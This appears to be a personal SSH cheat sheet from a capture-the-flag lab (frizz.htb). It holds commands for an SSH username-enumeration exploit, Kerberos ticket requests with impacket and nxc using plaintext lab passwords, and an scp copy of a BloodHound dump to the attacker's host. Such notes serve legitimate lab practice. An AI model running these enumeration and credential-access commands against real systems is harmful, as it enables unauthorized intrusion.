# tip
Use -vvv to debug 
# KRB5CCNAME vs KRB5_CONFIG
KRB5CCNAME selects credentials; KRB5_CONFIG selects configuration describing where the KDC is and how hostnames map to realms
### Version < 7.7
```
python sshUsernameEnumExploit.py <IP> -w <wordlist>
```

### SSH Login via kerberos
```
/etc/hosts(顺序必须一摸一样):
10.10.11.60     frizzdc.frizz.htb frizz.htb

impacket-getTGT frizzdc.frizz.htb/M.SchoolBus:'!suBcig@MehTed!R'
export KRB5CCNAME=ccache_file_dest
klist

If Cannot find KDC for realm "FRIZZ.HTB:
nxc smb 10.129.232.168 -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file=/home/kali/Desktop/frizz_krb5_config
export KRB5_CONFIG=/home/kali/Desktop/frizz_krb5.config

ssh f.frizzle@frizzdc.frizz.htb -k
```
Solving Cannot find KDC for realm "FRIZZ.HTB"
```
Generating krb5_config
nxc smb 10.129.232.168 -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file=/home/kali/Desktop/frizz_krb5_config
```
### SSH Config file in Linux
```
/etc/ssh/sshd_config
```
### SCP file transfer
```
scp -P 80 20250425032703_BloodHound.zip kali@10.10.14.3:/home/kali/Desktop/20250425032703_BloodHound.zip
```
### Privare Key
Check
```
openssl rsa -in pkcs11.txt -check
```
### SSH hostkey 
```
ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
```
ssh hostkey indicates the type of private key it accepts

### Generate pub/pri key pair
```
ssh-keygen -t dsa | ecdsa | ecdsa-sk | ed25519 | ed25519-sk | rsa -f /tmp/james_rsa

It will generate /tmp/james_rsa and /tmp/james_rsa.pub
```
